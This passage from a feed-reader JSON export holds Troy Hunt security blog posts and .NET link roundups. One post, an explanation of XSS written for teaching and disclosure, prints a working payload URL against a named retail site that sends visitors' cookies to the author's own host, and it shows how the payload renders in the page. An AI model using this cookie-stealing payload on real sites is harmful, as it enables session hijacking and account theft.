junior dev not realising what they were doing. Mind you, I’ve seen plenty of experienced devs make similar mistakes but it begs the question: just how easy is it to slip something through into a production? Is anyone actually overseeing the process? Or does one person have a few beers on a Friday afternoon and push the “publish” button?</p><p><strong>What’s the post-release review process?</strong>It’s<em>extremely</em>easy for configuration related vulnerabilities to slip through during the release process. For example a developer just wants to quickly check the details of an obscure error in a production environment so they release with verbose errors (i.e. turn off custom errors in ASP.NET) and promise themselves they’ll lock it down later. The release process should ideally catch this and set off all sorts of alarms.</p><p><strong>Are you contactable for when things go wrong?</strong>I hadn’t planned on including this section originally but given the way things played out (more on that another time), it does illustrate an important point. It was<em>extremely</em>difficult to get in touch with anyone from Black and Decker using social media and published email addresses and I eventually got through to them in a very round-a-bout fashion. It’s very hard for people to do the right thing and disclose privately when they can’t get in touch with you!</p><p>Black and Decker presented a good opportunity to illustrate the risk because of their sheer scale. This is a multinational organisation pulling in $6B a year and employing 27,000 people and something so simple slipped past them, is it any wonder that so many companies with such fewer resources struggle? And I’ll stress again – there is (unfortunately) nothing very unique about them having a risk of this nature – it’s alarmingly common as it’s so simple to do. Insecurity is indeed, easy.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/1gV-R5Qrv3k\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1224}}
{"k":"0000000084","o":"0000005610","v":"001"}
{"_id":1225,"_uid":1225,"_dt":1373742620965,"_s":"43736ce6823a48052d1d1d9835c15358"}
{"subscription":{"$wrap":"$oid","v":57},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/pczeDYOJ1KU/understanding-risk-of-mixed-content.html","title":"Understanding the risk of mixed content warnings","published":{"$wrap":"$date","v":1370897100001,"h":"2013-06-10T20:45:00.001Z"},"starred":false,"read":false,"content":"<p>Ever see one of these?</p><p><img width=\"456\" height=\"169\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"IE8 mixed content warning\" src=\"http://lh4.ggpht.com/-HNEehdDcnn4/UbY66rVDvoI/AAAAAAAAFZw/Iy-mb291COA/image%25255B2%25255D.png?imgmax=800\" border=\"0\"></p><p>Or these?</p><p><img width=\"668\" height=\"50\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"IE10 mixed content warning\" src=\"http://lh3.ggpht.com/-JU0V1DWCr68/UbY67ArIaFI/AAAAAAAAFZ4/fRlB9-lZoEM/image%25255B5%25255D.png?imgmax=800\" border=\"0\"></p><p>Or maybe this one?</p><p><img width=\"270\" height=\"106\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Chrome mixed content warning\" src=\"http://lh4.ggpht.com/-MVQqXSXTAR0/UbY67V140RI/AAAAAAAAFaA/wlRpn5YDjwc/image%25255B8%25255D.png?imgmax=800\" border=\"0\"></p><p>It means something is wrong with the website –<em>very wrong</em>– yet somehow we seem to keep building websites that do this. The problem, as you’ll see in the video below, is that it jeopardises the security of traffic going backwards and forwards over what otherwise appears to be a secure site, at least in terms of implementing SSL. This can lead to issues such as the theft of identity data, potentially including such personal information as social security numbers. Fortunately there’s a channel to report potentially fraudulent activity except that, well, this video explains it best:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/CSmacMZ0xZo?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>Of course it’s ironic that it’s the Social Security Administration that’s made a bit of a botch of this but it’s an all too familiar scenario.<a href=\"http://www.troyhunt.com/2012/07/lessons-in-website-security-anti.html\">Tesco did it</a>,<a href=\"http://www.troyhunt.com/2013/05/why-i-am-worlds-greatest-lover-and.html\">so did Versa Lift</a>,<a href=\"http://www.troyhunt.com/2013/04/5-ways-to-implement-https-in.html\">so did Top CashBack</a>and a heap of others I haven’t previously written about. It’s rampant.</p><p>That’s the risk covered, let’s focus on the fixes and they’re all dead easy:</p><ol><li>Embed external content explicitly via the HTTPS scheme. If you’re only serving the page over HTTPS anyway then it ensures no slip ups.</li><li>Use a protocol relative URL or in other words, embed resources such as the jQuery file in the example above as //ajax.googleapis.com/… Yes, I know it looks weird but it works and it means when the page is loaded over HTTP then the resource will be requested over HTTP. Load the page over HTTPS and the resource embeds over HTTPS.</li><li>Test your damn web pages! No seriously, this is a fundamentally basic flaw and as soon as you load the page most browsers will start complaining. Have we – even us developers – become so desensitised to security warnings that we totally ignore them?!</li></ol><p>For the curious, as I mention in the video this demonstration was achieved by mounting a man in the middle attack at the proxy level. I used<a href=\"http://fiddler2.com/\">Fiddler</a>as the proxy and<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler Script</a>to modify the jQuery file in the OnBeforeResponse event. Whilst all this occurred within my PC, it demonstrates the alibility for it to happen at a proxy server anywhere – or at the internet gateway of your local cafe, or elsewhere in the ISP, or via a<a href=\"http://www.enigmacurry.com/category/diy/\">wiretap</a>on an enthernet cable or<a href=\"http://www.troyhunt.com/2013/04/the-beginners-guide-to-breaking-website.html\">as I’ve shown recently with the Pineapple</a>, via a rogue wireless access point the victim is connected to, possibly even without their knowledge.</p><p>Now as with my previous video on<a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">the risk of loading login forms over HTTP</a>, many people will ask “Is this really a likely risk?” In fact that’s just<a href=\"https://twitter.com/paulswail/status/342836543855144960\">the discussion I had with Rob Conery</a>after the aforementioned post as even<a href=\"http://tekpub.com/\">TekPub</a>follows this pattern. I look at it like this: you implement SSL primarily because you’re concerned about the risk of someone intercepting your traffic. Assuming you acknowledge – and attempt to protect against – this risk, you accept that all the HTTP components of the communication remain vulnerable ergo you need to protect against the SSL anti-patterns mentioned here.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/pczeDYOJ1KU\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1225}}
{"k":"0000000084","o":"0000004711","v":"001"}
{"_id":1226,"_uid":1226,"_dt":1373742620965,"_s":"df84562061cb3c63c2bc62afc32d14cd"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/Pkvus0PokRM/","title":"The Morning Brew #1395","published":{"$wrap":"$date","v":1373445300000,"h":"2013-07-10T08:35:00.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blog.stevensanderson.com/2013/07/09/knockout-v2-3-0-released-v3-0-0-beta-available/\">Knockout v2.3.0 released; v3.0.0 beta available</a> - Steve Sanderson announces the release of Knockout 2.3.0, along with the beta release of Knockout 3.0.0.  The 2.x release brings performance and compatibility improvements along with bugfixes, and a couple of new features, and the 3.0 beta gives a taste of what is to come including substantial new binding features.</li><li><a href=\"http://blogs.msdn.com/b/specexplorer/archive/2013/07/09/spec-explorer-2010-release-3-5-3146-0-now-available.aspx\">Spec Explorer 2010 Release 3.5.3146.0 now available!</a> - The Spec Explorer team announce the release of Spec Explorer (2010) 3.5.3146.0 which brings with it support for Visual Studio 2012 in addition to 2010, multi-machine processing, model change detection and a new context menu.</li></ul><h3>Information</h3><ul><li><a href=\"http://tech.pro/tutorial/1317/c-performance-benchmark-mistakes-part-three\">C# Performance Benchmark Mistakes, Part Three</a> - The 3rd part of Eric Lippert’s series of Performance Benchmarking common mistakes is available now on Tech.pro.  In this post Eric discusses the significant difference in the first run of some code due to effects such as JIT compilation, and how performance in one environment does not equal performance in another.</li><li><a href=\"http://www.hanselman.com/blog/CrossPlatformPortableClassLibrariesWithNETAreHappening.aspx\">Cross-Platform Portable Class Libraries with .NET are Happening</a> - Scott Hanselman highlights recent developments for Portable Class Libraries, discussing how they are useful, looking at a number of the best portable libraries, and discussing how portable class libraries can go cross platform.</li><li><a href=\"http://haacked.com/archive/2013/07/09/the-lawyers-wont-let-us.aspx\">The Lawyers Won’t Let Us</a> - Phil Haack shares some thoughts on legal departments preventing alternative licensing of products, takes a look at the problem from a legal teams point of view (no change = no risk) and suggests that a good legal team should aim to make  things possible.</li><li><a href=\"http://odetocode.com/blogs/scott/archive/2013/07/09/getting-started-with-owin-katana-and-vs2013.aspx\">Getting Started With OWIN, Katana, and VS2013</a> - K. Scott Allen takes a short introductory look at OWIN (Open Web Interface in ,NET) and shows how and why its present in the new ASP.NET templates in Visual Studio 2013, illustrating with a simple example to serve web content from a console application.</li><li><a href=\"http://www.wintellect.com/blogs/jlikness/30-years-of-hello-world\">30 Years of Hello, World</a> - Jeremy Likness takes a look at the last 30 years of programming languages via the humble ‘Hello World’ program</li><li><a href=\"http://coding.smashingmagazine.com/2013/05/23/building-the-new-financial-times-web-app/\">Building The New Financial Times Web App (A Case Study)</a> - Wilson Page discusses some of the web development challenges they encountered while building the Financial Times web application, discussing how demanding briefs for the behaviour and appearance gave some opportunities to innovate on web standards.</li><li><a href=\"http://visualstudiomagazine.com/articles/2013/07/01/essential-knockout-js.aspx\">Essential Knockout.js</a> - Kelly Adams & Mark Michaelis gives a nice introduction to the key concepts and practices for development using Knockout.js in this Visual Studio Magazine article.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.nxtgenug.net/ViewEvent.aspx?EventID=584\">NxtGenUG - Event: Functional Programming with F# </a> - The Birmingham NxtGenUG welcome Ian Russell for a session exploring functional programming using the F# language, giving an introduction to functional programming and setting you on course to enjoy the ability to solve complex problems with simple maintainable code.</li><li><a href=\"http://mikehadlow.blogspot.co.uk/2013/07/brighton-alt-net-brighton-digital.html\">Brighton ALT NET @ Brighton Digital Festival</a> - Mike Hadlow highlights the special Brighton Alt.NET event taking place as a part of the Brighton Digital Festival during September 2013.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/Pkvus0PokRM\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1226}}
{"k":"0000000084","o":"0000003738","v":"001"}
{"_id":1227,"_uid":1227,"_dt":1373742620965,"_s":"109efe1310fde1f5c6471b577ae584e2"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/izegHQNYaY4/","title":"The Morning Brew #1393","published":{"$wrap":"$date","v":1373272080000,"h":"2013-07-08T08:28:00.000Z"},"starred":false,"read":false,"content":"<h3>Information</h3><ul><li><a href=\"http://ericlippert.com/2013/07/05/the-answer-to-the-string-concatenation-puzzle/\">The answer to the string concatenation puzzle</a> - Eric Lippert shares the less than obvious answers to last weeks string concatenation puzzle, looking at several cases where ‘addition’ of strings produces results you might not expect</li><li><a href=\"http://paulstovell.com/blog/two-week-sprints-twelve-month-releases\">Two week sprints; twelve month releases</a> - Paul Stovell discusses the importance of actually releasing software to end users as a part of an agile software development process, and the important role of taking that user feedback to improve the product.</li><li><a href=\"http://blogs.msdn.com/b/webdev/archive/2013/07/05/introducing-select-and-expand-support-in-web-api-odata.aspx\">Introducing $select and $expand support in Web API OData</a> - Javier Calvarro Nelson discusses the inclusion of $select and $exapnd support in the latest version of Web API’s OData implementation, looking at their purpose, use and implementation.</li><li><a href=\"http://madskristensen.net/post/Web-Essentials-2013-Where-is-the-TypeScript-support.aspx\">Web Essentials 2013: Where is the TypeScript support?</a> - Mads Kristensen discusses the removal of TypeScript support (amongst other features removed) when Web Essentials was ported to Visual Studio 2013, discussing how removal now paves the way for core Visual Studio support to be added without conflicts.</li><li><a href=\"http://mtaulty.com/CommunityServer/blogs/mike_taultys_blog/archive/2013/07/05/azure-mobile-services-update-custom-apis.aspx\">Azure Mobile Services Update - Custom APIs</a> - Mike Taulty takes a look at the support for adding custom APIs to Windows Azure Mobile Services via code in Node.js (with .NET support coming soon), walking through a sample implementation.</li><li><a href=\"http://gunnarpeipman.com/2013/07/what-is-claims-based-authentication/\">What is claims-based authentication?</a> - Gunnar Peipman prepares the ground for a number of future posts with an explanation of the key concepts of Claims Based Authentication</li><li><a href=\"http://blogs.msdn.com/b/robch/archive/2013/07/05/wp8-speech-exploring-the-mvvm-pattern.aspx\">WP8 Speech - Exploring the MVVM pattern</a> - Rob Chambers discusses his experiences implementing a Windows Phone 8 application using the MVVM, sharing parts of the code for the application and discussing the implementation of a number of features</li><li><a href=\"http://www.codeproject.com/Articles/617043/Hack-Proof-Your-ASP-NET-Application-From-Cross-Sit\">Hack Proof Your ASP.NET Application From Cross Site Scripting (XSS)</a> - Sarvesh Kushwaha shares a useful reminder of the different classes of Cross Site Scripting attack possible in web applications, and explores how to protect your applications for exploit</li><li><a href=\"http://codebetter.com/johnvpetersen/2013/07/05/a-simple-jquery-qunit-based-javascript-unit-test-project-template/\">A simple jQuery Qunit-based JavaScript Unit Test Project Template </a> - John V Petersen takes a look at testing JavaScript with QUnit based tests using the Chutzpah JavaScript Unit Test Runner and sharing a project template to make it easier to get started writing tests.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/izegHQNYaY4\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1227}}
{"k":"0000000084","o":"0000020421","v":"001"}
{"_id":1228,"_uid":1228,"_dt":1373742620965,"_s":"ef397670132bc7d2569565cbab7fa65a"}
{"subscription":{"$wrap":"$oid","v":57},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/93WStnpJ4b0/understanding-xss-input-sanitisation.html","title":"Understanding XSS – input sanitisation semantics and output encoding contexts","published":{"$wrap":"$date","v":1369858740001,"h":"2013-05-29T20:19:00.001Z"},"starred":false,"read":false,"content":"<p>Cross site scripting (henceforth referred to as XSS) is one of those attacks that’s both extremely prevalent (remember, it’s number 2 on<a href=\"http://www.troyhunt.com/2010/05/owasp-top-10-for-net-developers-part-2.html\">the OWASP Top 10</a>) and frequently misunderstood. You’ll very often see<em>some</em>attempt at mitigating the risk but then find it’s easily circumvented because the developers weren’t fully aware of the attack vectors.</p><p>Last week someone flicked me over a great example of this after having read my previous post<a href=\"http://www.troyhunt.com/2012/07/heres-why-we-keep-getting-hacked-clear.html\">Here’s why we keep getting hacked – clear and present Billabong failures</a>. In that post I pointed out the ease with which you could decorate Billabong’s registration page with the beautiful Miranda Kerr and a slightly stoned looking Bugs Bunny. In this post here, the ramifications of getting XSS wrong means stealing someone’s session and pulling out their personal details, all because of this:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh3.ggpht.com/-HQJEtHP7vlU/UaZit9xh1KI/AAAAAAAAFYo/Zs_aoCI6mN4/image12.png?imgmax=800\" border=\"0\"></p><p>I’ll come back to that, let’s first go back to the title and focus on input sanitisation and output encoding contexts. If XSS is an entirely new concept to you, start by taking a look at<a href=\"http://www.troyhunt.com/2010/05/owasp-top-10-for-net-developers-part-2.html\">my post on it here</a>then come back to this one.</p><a name='more'></a><h4>Sanitising user input</h4><p>The theory goes like this: expect any untrusted data to be malicious. What’s untrusted data? Anything that originates from outside the system and you don’t have absolute control over so that includes form data, query strings, cookies, other request headers, data from<em>other</em>systems (i.e. from web services) and basically anything that you can’t be 100% confident doesn’t contain evil things.</p><p>Evil things can be SQL injection, malicious files, attempts to traverse internal directory structures or XSS payloads. So what do you do about untrusted data? You try and filter it out and there are two ways to approach this:</p><ol><li><strong>Blacklist:</strong>You describe everything you know is<em>bad</em>, for example you don’t allow a&lt;script&gt; tag or quotes. The trick here is that you have to comprehensively come up with everything that you think might be bad and add it to the blacklist. If untrusted data contains one of these bad patterns, you reject it.</li><li><strong>Whitelist:</strong>You describe everything you know is<em>good</em>, for example letters and numbers. The trick here is that you have to comprehensively come up with everything that you think might be legitimately provided by a user and allow it. If untrusted data is not entirely made up from patterns in the whitelist, you reject it.</li></ol><p>Whitelists are almost always preferable because they’re very explicit; only describing what you know to be good is a very discrete way of handling untrusted data. The problem with blacklists is that you don’t know what you don’t know. For example, you decide that double quotes are evil as they could be used to break out of an HTML attribute but later on realise that angle brackets could do the same thing in some browsers even though the HTML would be malformed. Or an entirely new attack vector raises its head.</p><p>Whitelists can be<em>very</em>simple, for example if you expect an integer or a GUID for an ID it’s very simple to typecast it and ensure it complies to that pattern. Likewise, a pattern such as a URL or an email address can be assessed against a regular expression rather than just accepting whatever the user provides. Things like people’s names are a little harder (many an Irishman has been rejected by sites that disallow single quotes), but there is much discussion and many examples of regexes that facilitate natural language characters and punctuation. Of course they also need to be conscious of things like non-Latin characters but again, this is an often held discussion with many examples of how to allow the good stuff while keeping out the bad stuff.</p><p>So let’s get back to Billabong and look at sanitisation. They follow a pretty tried and (kind of) trusted pattern of repeating the search term in the URL so that when you search for something like “shirt”, you see this:</p><p><img width=\"650\" height=\"400\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search term reflected in page body\" src=\"http://lh6.ggpht.com/-dX-eaItsbvk/UaZiumJFu4I/AAAAAAAAFYw/fW6s0AG05F0/image15.png?imgmax=800\" border=\"0\"></p><p>However, search for something like “&lt;script&gt;” and you’ll get this:</p><p><img width=\"650\" height=\"198\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for&lt;script&gt; rejected by input sanitisation\" src=\"http://lh6.ggpht.com/-ktsqf97wKBY/UaZivY8OYVI/AAAAAAAAFY4/D3_dYJroc90/image18.png?imgmax=800\" border=\"0\"></p><p>Clearly there’s some sanitisation going on here, it’s just a question of whether it’s sufficient. If we modify that slightly we’ll see that if the leading angle bracket is dropped then the search goes through just fine:</p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for script&gt; is allowed\" src=\"http://lh5.ggpht.com/-4s4wxEIS-zI/UaZiv5D_WSI/AAAAAAAAFZA/tUhk7Xcs0-s/image21.png?imgmax=800\" border=\"0\"></p><p>But hang on – why allow a greater than but not a less than? It’s starting to look like tag-blacklisting which per the definition above, is always going to be a bit dodgy. By process of elimination it’s easy to discover which characters are allowed through and beyond the obvious alphanumeric ones, they include<strong>:/\\’;”%.?</strong></p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A successful search for the characters :/\\’;”%.?\" src=\"http://lh6.ggpht.com/-cQ5ZuU2sDuM/UaZiwjAFipI/AAAAAAAAFZI/I7JWkkQUJ7I/image24.png?imgmax=800\" border=\"0\"></p><p>Some of those are punctuation which you might find in a product name someone would legitimately search for, but probably not characters like a double quote, a semicolon or a percent. Perhaps there are edge cases, but as we’re about to see, it’s the sort of thing you want to have a genuine need for before using.</p><h4>Output encoding contexts</h4><p>If you’re reading this, chances are you know what HTML markup looks like. For example, a paragraph tag is represented in markup as&lt;p&gt; (this is painfully obvious but bear with me). Thing is though, if you wanted to render that tag into the browser – just like I have here – then the actual markup is&lt;p&gt; where the angle brackets are represented by HTML escape characters. If they weren’t escaped then you’d literally end up with a paragraph tag in the markup and it wouldn’t be visible in the browser.</p><p>Let’s go back to Billabong and take a look at the lifecycle of the untrusted data that is the search term. Firstly, it’s actually only rendered into the source code in one location and that’s in JavaScript. When we searched for “shirt”, it ended up in this script block (see the second line):</p><pre class=\"code\"><span style=\"background: white; color: blue\">&lt;</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: red\">type</span><span style=\"background: white; color: blue\">=\"text/javascript\"&gt;var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'shirt'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">ProductSquareDefault =</span><span style=\"background: white; color: #a31515\">'/images/placeholder-{0}.jpg'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">quantityMin = 1;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showOutOfStock =</span><span style=\"background: white; color: blue\">false</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showProductsWithImageOnly =</span><span style=\"background: white; color: blue\">true</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">discount =</span><span style=\"background: white; color: blue\">null</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">&lt;/</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: blue\">&gt;</span></pre>It then got sent off to an API in the query string:<a title=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\" href=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\">https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false<br></a><p>This API returns a JSON response with the results needed to build up the categories on the left under the search box (“Collections”, “Men”, “Women”, etc.) and then another API is called with the term in the query string again:<a href=\"https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true\">https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true</a></p><p>This then returns a<em>whopping</em>big JSON response of nearly 300kb (gzip, people!) with the individual results. All of this is orchestrated by a JavaScript file called<a href=\"https://au.shop.billabong.com/js/pages/search/search.js\">search.js</a>(minification, people!) which includes this piece of jQuery syntax:</p><pre class=\"code\"><span style=\"background: white; color: black\">$(</span><span style=\"background: white; color: #a31515\">'.search-form .searchkwd'</span><span style=\"background: white; color: black\">).val(keyword);</span></pre><p>The important thing in the context of output encoding is that this then sets the search term into the text box using the val() method in jQuery. This all happens in the DOM so there isn’t the same opportunity to exploit an XSS risk as if it was just reflected directly into the markup in the same way that we often see search features implemented. Yet there remains a risk…</p><p>Earlier we saw the word “shirt” appear in the JavaScript block which raises the question: is there any output encoding happening here? Let’s check by going back to one of the earlier searches which was for “script&gt;”. Here’s what we see:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script&gt;'</span><span style=\"background: white; color: black\">;</span></pre><p>This is where the problem begins because there’s no encoding happening. Earlier on we talked about a greater than sign encoding to&gt; in HTML, what you have to remember is that in JavaScript it’s a totally different syntax and what you need there is \\x3c or in other words, this is what the script<em>should</em>look like:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script\\x3c'</span><span style=\"background: white; color: black\">;</span></pre><p>That’s now enough to establish there’s an exploitable risk on the site, let’s look at how that might happen.</p><h4>Exploiting unsanitised data with unencoded output</h4><p>Remembering that the character<strong>:/\\’;”%.?</strong>are all allowed through the sanitisation and that it looks like they’ll happily be rendered as-is to the JavaScript context, the question now becomes “what can we do with this”? This a site that can be authenticated to and given that authenticated sessions on websites are almost always persisted by authentication cookies, let’s take a look at those. Of course there is a native browser defence against accessing cookies on the client side cookies and I wrote about it recently in<a href=\"http://www.troyhunt.com/2013/03/c-is-for-cookie-h-is-for-hacker.html\">C is for cookie, H is for hacker – understanding HTTP only and Secure cookies</a>.</p><p>That native defence is the HttpOnly cookie and when a cookie is flagged as such, it can’t be grabbed by JavaScript. However, here are Billabong’s cookies:</p><p><img width=\"688\" height=\"369\" title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"image\" src=\"http://lh5.ggpht.com/-LAFGSnIMJa0/UaZixGVC22I/AAAAAAAAFZQ/0rL3kL8vyew/image27.png?imgmax=800\" border=\"0\"></p><p>There is only one HttpOnly cookie and it’s the ASP.NET_SessionId which is HttpOnly by default. Given this is an ASP.NET app it’s also worth pointing out that were this site to be using the framework’s implementation of forms authentication we’d see a .ASPXAUTH cookie for persisting the authenticated session and it<em>would</em>be flagged as HttpOnly. Instead we see the highlighted CustomerSession cookie which is all that’s needed to steal the session – and it’s not HttpOnly. This is<em>precisely</em>why you’ll often hear people (myself included) say how it important it is to use existing, proven security implementations.</p><p>So that tells us enough to know that there’s something useful to be gained by grabbing cookies. Get that from a logged in user and you can become them. Let’s try this URL:<a title=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\" href=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\">https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//</a></p><p>You may be able to guess what’s in there but it makes a lot more sense when you see it rendered – without any output encoding – to the source of the page:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'\\''</span><span style=\"background: white; color: black\">; location.href =</span><span style=\"background: white; color: #a31515\">\"http://hackyourself.troyhunt.com/Cookies/?c=\"</span><span style=\"background: white; color: black\">+ encodeURIComponent(document.cookie);</span><span style=\"background: white; color: green\">//';</span></pre><p>Make sense now? It breaks down into three parts:</p><ol><li>Close off the keyword variable assignment and terminate the statement.</li><li>Redirect the browser to my website along with all the URL encoded cookies that the browser can access (anything not flagged as HttpOnly).</li><li>Comment out the remaining statement (this is the characters normally used to close off the keyword string and terminate the statement).</li></ol><p>As a result of this, I now have your cookies and that includes your session ID:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh4.ggpht.com/-QFj9UGnEAXI/UaZix9ZiQzI/AAAAAAAAFZY/D7g_pzhNElA/image31.png?imgmax=800\" border=\"0\"></p><p>Of course I (or an attacker) need to be able to get a victim to follow a link with the XSS payload in it<em>and</em>make sure it’s a victim that’s actually logged into Billabong at the time, but that’s precisely why we have all the defences discussed above.</p><h4>Somebody didn’t hack themselves first…</h4><p>This is precisely the sort of thing I was talking about the other day when I wrote<a href=\"http://www.troyhunt.com/2013/05/hack-yourself-first-how-to-go-on.html\">Hack yourself first – how to go on the offence before online attackers do</a>. Here we have three ridiculously simple risks that anyone can identify remotely (and someone obviously did):</p><ol><li>Insufficient untrusted data sanitisation</li><li>No output encoding whatsoever</li><li>Auth cookie not flagged as HttpOnly</li></ol><p>This is a really good example of how multiple independent risks can be chained together to create a single exploit. It also illustrates why each of those risks, whilst they might seem small and insignificant in isolation, are actually extremely important. Of course it’s entirely possible the developers weren’t aware of these and didn’t know what to look for in the first place, indeed that’s why I wrote the aforementioned post on hacking yourself and will be talking much, much more about this in the future. I thought this was a great example why.</p><h4>Disclosure</h4><p>This week I wrote about<a href=\"http://www.troyhunt.com/2013/05/the-responsibility-of-public-disclosure.html\">The responsibility of public disclosure</a>and the very disappointing responses I often have when doing my darndest to privately reach out to the owners of at-risk websites. Conversely, disclosures that went public straight away and got press resulted in very swift action and benefited those at risk and those who could do well to learn from the experience (namely other developers). I then laid out what IMHO are very practical, sensible guidelines I follow when writing about any risk.</p><p>In this case, it’s hardly a smoking gun and not something you can go out and do immediate damage with, it’s certainly not a Black and Decker case where there are public logs with user credentials in them. I reached out to Billabong via twitter (yes, it’s a manned account) three times, firstly<a href=\"https://twitter.com/troyhunt/status/338437306077810688\">on Sunday</a>and got no response then<a href=\"https://twitter.com/troyhunt/status/339148328078024705\">on Tuesday</a>then again<a href=\"https://twitter.com/troyhunt/status/339536663380381696\">on Wednesday</a>. No response. Zip. Nada. Again.</p><p>Disclosure is indeed hard.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/93WStnpJ4b0\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1228}}
{"k":"0000000084","o":"0000007040","v":"001"}
{"_id":1229,"_uid":1229,"_dt":1373742620966,"_s":"a27eb3988ebc7b78219e848bec63795c"}
{"subscription":{"$wrap":"$oid","v":57},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/2MOCxoW2JyE/your-login-form-posts-to-https-but-you.html","title":"Your login form posts to HTTPS, but you blew it when you loaded it over HTTP","published":{"$wrap":"$date","v":1369050360001,"h":"2013-05-20T11:46:00.001Z"},"starred":false,"read":false,"content":"<p>Here’s an often held conversation between concerned website user and site owner:</p><p><strong>User:</strong>“Hey mate, your website isn’t using SSL when I enter my password, what gives?!”</p><p><strong>Owner:</strong>“Ah, but it<em>posts</em>to HTTPS so your password is secure! We take security seriously. Our measures are robust.” (and other random, unquantifiable claims)</p><p>Loading login forms over HTTP renders any downstream transport layer security almost entirely useless. Rather than just tell you what’s wrong with this, let me show precisely why this is with a site that implements this pattern:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/nm-85-bDP6c?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>How’s that for simple?! What people forget about SSL is 